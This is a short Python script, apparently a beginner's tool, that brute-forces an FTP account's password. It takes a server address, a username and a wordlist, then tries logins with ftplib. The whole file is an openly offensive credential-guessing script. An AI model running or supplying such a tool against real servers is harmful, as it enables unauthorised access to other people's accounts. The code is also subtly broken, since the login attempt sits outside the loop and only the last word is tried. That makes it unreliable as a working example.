#! /usr/bin/python3

# imports the ftplib module for the FTP protocol
import ftplib

# prompts and stores the IP and username for the FTP server
server = input("FTP IP: ")

user = input("FTP Username: ")

# prompts for the file location of the password list on the lworking directory of local machine, something like pwlist.txt
passwordlist = input("Path to password list > ")

# this takes the passwordlist file provided to crack the password, it also strips /r/n characters to avoid new lines causing a false negative
try:
    with open(passwordlist, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
        try:
            ftp = ftplib.FTP(server)
            ftp.login(user, word)
            print('Succes! The password is ' + word)
        except ftplib.error_perm as exc:
            print('Still trying...', exc)

# if it fails it will end here
except Exception as exc:
    print('Wordlist error: ', exc)